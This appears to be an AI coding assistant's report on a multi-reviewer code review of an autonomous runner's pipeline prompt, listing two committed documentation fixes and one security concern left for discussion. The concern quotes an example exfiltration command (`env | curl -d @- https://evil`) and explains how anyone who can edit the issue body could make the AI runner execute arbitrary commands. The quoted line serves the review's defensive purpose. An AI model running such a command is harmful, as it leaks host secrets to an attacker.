Committed as **afd1d54**. The untracked `docs/reviews/epic-3-cp2.md` was correctly left out of scope.

**Step 10.5 — Review-of-fixes:** Both fixes were mechanical transcription of validated recommendations (appended a clause to one sentence; deleted one redundant sentence) — no fresh logic, no new code path. → **skipped (mechanical).**

---

```
═══ MULTI-REVIEW REPORT ═══
Diff: 4 files, 466 lines (3 commits 7757eef..HEAD, no working tree)
Size: medium — roster: specialist + simplifier + deep-scan + security (no --codex)
Reviewers: specialist ✓  simplifier ✓  deep-scan ✓  security ✓
Validation: 3 findings validated: 3 confirmed, 0 demoted, 0 refuted
Review-of-fixes: skipped (mechanical)
```

**✅ FIXED & COMMITTED (2 items, `afd1d54`)**
1. `[1/4]` `agent/internal/runnerfiles/files/{claude,codex}/epic-pipeline.md:273` — **Gate auto-merge summary omitted the platform-requirements-met condition**
   Reviewers: deep-scan — Verified against `gate.go:68-70`: `Decide` escalates whenever `unmetRequirements` is non-empty (any requirement not `met`, incl. `(missing)`), but the runner prompt's own gate summary listed only `unresolved:0` / `uncertain:false` / CI / `reviews⊇required`. That made the prompt internally incoherent with its new Step 7.3 rule ("don't route an unmet command-backed status to `unresolved`") — the rule is only safe *because* the gate escalates independently, which the summary never stated. Added the requirements condition to both variants.
2. `[1/4]` `agent/internal/runnerfiles/files/{claude,codex}/epic-pipeline.md:232` — **Step 7.3 paragraph restated the final-review-independence rule twice**
   Reviewers: simplifier — The clause "though independent final-review findings remain" and the trailing sentence "Final-review finding counts remain independent of structured platform statuses." said the same thing. Dropped the strict restatement in both variants (scoped tightly — left the broader epic-specific vs. review-judgment routing sentences intact, since those aren't strict duplicates).

**🗣️ NEEDS DISCUSSION (1 item) — not applied**
a. `[1/4]` `agent/internal/runnerfiles/files/{claude,codex}/epic-pipeline.md:216` — **Runner executes carrier `check_cmd` verbatim from the issue body with no authoritative cross-check**
   Reviewers: security
   Concern: This is a **real** trust boundary — a principal who can edit the epic issue body can substitute an arbitrary `check_cmd` (e.g. `env | curl -d @- https://evil`) that the autonomous runner executes verbatim on the runner host, and the gate never validates the command string (`unmetRequirements` joins only `id→status`). **However**, the validator confirmed it is an already-recorded, human-accepted v1 decision (commit `d8410ad`; `docs/plans/epic-3.md §"Accepted v1 trust boundary"` — "owner/runners who can edit it can already edit code the runner executes"). So it's surfaced for record completeness, not as an introduced regression.
   Reviewer's suggested fix: Accept as-is for v1. For v2 (already scoped): re-derive/execute `check_cmd` from authoritative `Project.Requirements` keyed by the stable `id`, or sign the carrier; on any `id→command` mismatch, escalate instead of execute.

**🚫 REFUTED BY VALIDATION:** none.

**📝 NITPICKS:** none applied. (Lens *notes* raised two low-confidence non-defects — `via:cmd` stated in both procedure and schema prose, and the single-use "first dogfood run" meta-check now baked into a reusable prompt — but both were judged intentional by their own reviewers and I didn't manufacture them into findings.)

*Note: per CLAUDE.md convention I omitted the `Co-reviewed-by` trailer (project forbids AI-attribution trailers).*

**Fixed 2, 1 needs discussion, 0 nitpicks, 0 refuted.**

---

**Step 12 — the one discussion item.** There's nothing to *apply* here: the verbatim-`check_cmd` trust boundary is already the intended, human-signed-off v1 behavior, and the prompt now correctly warns about it. My recommendation is to **leave it as-is for v1** — hardening it (authoritative re-derivation or signed carrier) is genuinely v2 work with real design surface (where does the runner get the authoritative requirements at execution time — a hub round-trip? a signature over the carrier?), not a blind fix to slip into this epic.

Do you want me to (a) leave it recorded as-is (my recommendation), or (b) open a tracking issue for the v2 authoritative-lookup/signed-carrier hardening so it isn't lost? I won't touch the v1 decision either way unless you ask.
